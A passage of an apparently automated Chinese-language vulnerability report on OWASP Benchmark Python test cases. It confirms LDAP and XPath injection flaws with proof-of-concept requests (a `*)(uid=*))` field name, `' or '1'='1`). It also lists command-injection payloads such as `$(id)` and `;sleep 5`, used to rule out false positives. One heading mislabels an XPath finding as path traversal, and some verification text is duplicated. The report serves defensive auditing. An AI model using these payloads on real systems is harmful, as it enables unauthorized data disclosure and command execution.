+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：数据流已确证
+
+**① 位置** — sink：`testcode/BenchmarkTest00427.py:49` (函数 `BenchmarkTest00427_post`)
+  · source：`testcode/BenchmarkTest00427.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00427.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00427.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00427.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00427_post@testcode/BenchmarkTest00427.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审阅确认存在 LDAP 注入漏洞。入口 `BenchmarkTest00427_post`（路由 `/benchmark/ldapi-00/BenchmarkTest00427`）从 POST 表单的**字段名**（而非字段值）中提取用户可控输入：遍历 `request.form.keys()`，取其中值包含子串 "BenchmarkTest00427" 的字段的键名作为 `param`（第32-34行）。该参数经 dict 赋值后（第37-41行，无任何净化）直接以 f-string 形式嵌入 LDAP 搜索过滤器 `f'(&(objectclass=person)(uid={bar}))'`（第47行），然后调用 `ldap3.Connection.search()` 执行查询（第50行）。imported 的 `escape_for_html` 函数（第19行）仅为 HTML 转义用，未对 LDAP 过滤器做任何净化。攻击者可构造恶意字段名（如 `*)(uid=*`）改变 LDAP 过滤器语义，返回未授权的条目。未能在沙箱中动态复现是因为服务器 8443 端口路由匹配异常（返回 404/405），无法建立可靠的 POST 会话。
+  · 动态：未复现 — 代码审阅确认存在 LDAP 注入漏洞。入口 `BenchmarkTest00427_post`（路由 `/benchmark/ldapi-00/BenchmarkTest00427`）从 POST 表单的**字段名**（而非字段值）中提取用户可控输入：遍历 `request.form.keys()`，取其中值包含子串 "BenchmarkTest00427" 的字段的键名作为 `param`（第32-34行）。该参数经 dict 赋值后（第37-41行，无任何净化）直接以 f-string 形式嵌入 LDAP 搜索过滤器 `f'(&(objectclass=person)(uid={bar}))'`（第47行），然后调用 `ldap3.Connection.search()` 执行查询（第50行）。imported 的 `escape_for_html` 函数（第19行）仅为 HTML 转义用，未对 LDAP 过滤器做任何净化。攻击者可构造恶意字段名（如 `*)(uid=*`）改变 LDAP 过滤器语义，返回未授权的条目。未能在沙箱中动态复现是因为服务器 8443 端口路由匹配异常（返回 404/405），无法建立可靠的 POST 会话。
+
+**PoC**：
+```
+POST /benchmark/ldapi-00/BenchmarkTest00427 HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+
+*)(uid=*))=BenchmarkTest00427
+
+解释：字段名为 `*)(uid=*))`，其值 `BenchmarkTest00427` 触发条件；拼接后过滤器变为 `(&(objectclass=person)(uid=*)(uid=*))))`，其中 `(uid=*)` 匹配所有用户，导致 LDAP 搜索结果返回全部条目（信息泄露）。
+```
+
+**修复建议**：1. 使用 ldap3 提供的转义函数对用户输入进行过滤器转义：`from ldap3.utils.conv import escape_filter_chars`，然后 `safe_bar = escape_filter_chars(bar)` 再拼接。2. 或改用参数化 LDAP 查询（如 ldap3 的 filter 参数支持过滤器模板）。3. 避免将任何用户可控数据直接嵌入 LDAP 搜索过滤器字符串。
+
+### 2.53 Path Traversal — testcode/BenchmarkTest00107.py:56
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：MEDIUM (CVSS v3.1 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=低；完整性影响=无；可用性影响=无
+- **置信度**：数据流已确证
+
+**① 位置** — sink：`testcode/BenchmarkTest00107.py:56` (函数 `BenchmarkTest00107_post`)
+  · source：`testcode/BenchmarkTest00107.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00107.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00107.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00107.py:56` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00107_post@testcode/BenchmarkTest00107.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审查确认存在 XPath 注入漏洞：用户通过 POST 表单参数 'BenchmarkTest00107' 传入的不可信输入（第31行），经由 match/case 分支 'A'（guess='A'，第39-40行）直接赋值给 bar，在无任何净化的情况下拼接进 XPath 查询（第54行），并传入 lxml.etree 的 xpath() 方法执行（第56行）。但 testcode/BenchmarkTest00107.py 第62行存在 Python f-string 语法错误（单引号嵌套冲突导致 SyntaxError: f-string: expecting '}'），使该模块无法被 importlib 加载，Flask 路由注册失败（app.py 第31行的 importlib.import_module 抛出异常被静默吞掉）。动态验证返回 404，证实路由未注册。因此漏洞代码真实存在，但受语法错误影响运行时不可达。
+  · 动态：未复现 — 代码审查确认存在 XPath 注入漏洞：用户通过 POST 表单参数 'BenchmarkTest00107' 传入的不可信输入（第31行），经由 match/case 分支 'A'（guess='A'，第39-40行）直接赋值给 bar，在无任何净化的情况下拼接进 XPath 查询（第54行），并传入 lxml.etree 的 xpath() 方法执行（第56行）。但 testcode/BenchmarkTest00107.py 第62行存在 Python f-string 语法错误（单引号嵌套冲突导致 SyntaxError: f-string: expecting '}'），使该模块无法被 importlib 加载，Flask 路由注册失败（app.py 第31行的 importlib.import_module 抛出异常被静默吞掉）。动态验证返回 404，证实路由未注册。因此漏洞代码真实存在，但受语法错误影响运行时不可达。
+
+**PoC**：
+```
+如果修复语法错误后（将第62行 f-string 改为双引号包裹），PoC 为：
+```
+POST /benchmark/xpathi-00/BenchmarkTest00107
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00107=' or '1'='1
+```
+预期返回所有员工信息（布尔盲注/注入）。或探测其他节点：
+```
+BenchmarkTest00107=foo' and type(../*)='foobar
+```
+```
+
+**修复建议**：1. 修复第62行语法错误：将 f-string 的界定符改为双引号、或转义内嵌单引号；2. 使用参数化 XPath 查询（如 lxml 不支持原生参数化，可使用 XPath 变量绑定或预编译表达式前对输入做白名单校验）；3. 对用户输入进行严格净化，只允许预期的合法字符（如仅数字/字母），或使用专门的 XPath 注入防护库。
+
+
+## 3. 已排除项（附录）
+
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest00512.py:56` — 经代码阅读与动态验证确定：用户输入（request header 'BenchmarkTest00512'）虽被读入（line 31）并通过 ConfigParser.set() 存入 keyB-41882（line 41），但随后 bar 是从 keyA-41882 读取（line 42），而 keyA-41882 被硬编码为 'a_Value'（line 40）。因此无论用户输入什么 payload，最终执行的命令始终是 `sh -c echo a_Value`，用户输入完全不参与命令拼接。
+
+动态验证：携带 'hello;id'、'$(id)' 等注入 payload 发起 POST 请求，返回结果与不带 payload 的请求完全一致，均为 `echo a_Value` 的输出，无命令注入迹象。该候选为误报（false positive）。
+- CWE-502 Insecure Deserialization @ `testcode/BenchmarkTest00826.py:52` — The candidate is a false positive. Code logic analysis and live runtime testing both prove the user input cannot reach pickle.loads(). The list manipulation (lines 37-43) ensures bar is always the hardcoded string 'moresafe': lst = ['safe', param, 'moresafe']; lst.pop(0) → [param, 'moresafe']; bar = lst[1] → 'moresafe'. The CodeQL dataflow engine produced a false positive because it does not properly model Python list indexing semantics — specifically that lst[1] after pop(0) selects the hardcoded 'moresafe' element, not the user-controlled param. Sending a crafted malicious pickle payload (which would trigger RCE if the code were vulnerable) always results in 'Unpickling failed!' because base64.urlsafe_b64decode() is called on 'moresafe' instead of the payload.
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest00736.py:55` — The user input (param from request.args) is stored in map81232['keyB-81232'] on line 37 and assigned to bar on line 40, but then immediately overwritten with map81232['keyA-81232'] ('a-Value') on line 41. Thus the shell command becomes `sh -c echo a-Value` regardless of user input. Runtime testing confirmed: all payloads (;id, ;ls, ;sleep 5, INJECTED_12345, DIFFERENT_VALUE) produce identical 307-byte responses with ~3ms response time — no timing delay, no output variation. The OS command injection is not exploitable.
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest00900.py:59` — 经仔细阅读代码与运行时测试确认：用户输入（参数 param）在第44行被写入 ConfigParser 的 keyB-10363，但第45行 bar = conf10363.get('section10363', 'keyA-10363') 读取的是 keyA-10363——该键在第43行被硬编码为常量字符串'a_Value'。因此 bar 恒等于 'a_Value'，用户输入完全没有流入第56行的 shell 命令。最终执行的命令始终为 echo a_Value，不可被用户输入影响。CodeQL 污点分析（cg_dataflow）也确认了从 param 到 subprocess.run 不存在数据流。
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest01097.py:55` — 该候选漏洞被驳回，原因有二：
+
+**1. 条件恒真，用户输入永不流入命令：**
+第38行 `if 7 * 42 - num > 200:` 中 `num=86`，计算得 `208 > 200` 恒为 True。因此第39行 `bar = 'This_should_always_happen'` 始终执行，第41行 `bar = param`（污点路径）是死代码，永远不可达。
+
+**2. 污点源 param 并非真正的用户可控输入：**
+`param = request.path.split("/")[1]` 取自 URL 路径首段。Flask 路由硬编码为 `/benchmark/cmdi-00/BenchmarkTest01097`，因此 `param` 固定为字符串 `"benchmark"`，用户无法通过修改路径改变它（修改路径会导致 404）。
+
+**结论：** 虽然 `subprocess.run(argStr, shell=True)` 是危险 sink，但用户可控数据（param）在数据流中已被恒真条件阻断，实际执行的命令始终是 `sh -c echo This_should_always_happen`，不含任何用户输入。这是一个经典的 SAST 误报（OWASP Benchmark 故意设计的 FP 用例）。
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest01098.py:53` — 该候选被判定为误报。代码确实在 BenchmarkTest01098.py:53 使用了 subprocess.run(argStr, shell=True) 且通过 f-string 插入了变量 bar，但污点来源 request.path.split('/')[1]（第31-32行）并非用户可控——Flask 精确路由 @app.route('/benchmark/cmdi-00/BenchmarkTest01098') 确保只有该确切路径能触发此处理器，因此 parts[1] 始终是固定值 'benchmark'。代码库中正确的用户可控输入模式是 request.form.get() / request.args.get() / helpers.utils.get_parameter()（如 BenchmarkTest00165），而本用例错误地从 URL 路径段读取输入。用户无法通过任何手段（改变路径/查询参数/表单数据/HTTP 头）控制传递给 shell 命令的 bar 变量。尝试向不同路径发送请求均返回 404/405，证明路由严格精确匹配。
+- CWE-78 OS Command Injection @ `testcode/BenchmarkTest01173.py:51` — 代码结构上看起来是命令注入（subprocess.run + shell=True + 字符串拼接），但污点源 helpers.separate_request.request_wrapper.get_safe_value() 返回固定字符串 'bar'，完全不接受用户输入（form/query/cookie）。因此 param 恒为 'bar'，最终执行的命令恒为 'sh -c echo bar'，不可由攻击者控制。这是 SAST 基准测试中有意设计的「非漏洞」用例（hardcoded safe value 阻断污点流），LLM 误报。已用 http_probe 发送多种注入 payload 确认用户输入未被采纳。
+
+## 4. 方法与局限
+
+- 采用「高召回发现 + 可达性闸门 + 独立双层验证」流水线；置信度分级如实标注。
+- 动态验证针对可复现类漏洞在隔离沙箱中进行；逻辑类漏洞以静态数据流结论为准。
+- **严重度按 CVSS v3.1 基础分标准公式计算**；其向量（AV/AC/PR/UI/S/C/I/A）由验证官**据每个漏洞的具体情况**评定（是否需鉴权、暴露面、是否需用户交互、能否越权、实际读/改/破坏影响），而非套用漏洞类别的默认值——故同类漏洞在不同上下文下评分可不同。各项含义见每条漏洞下的「CVSS 向量说明」。
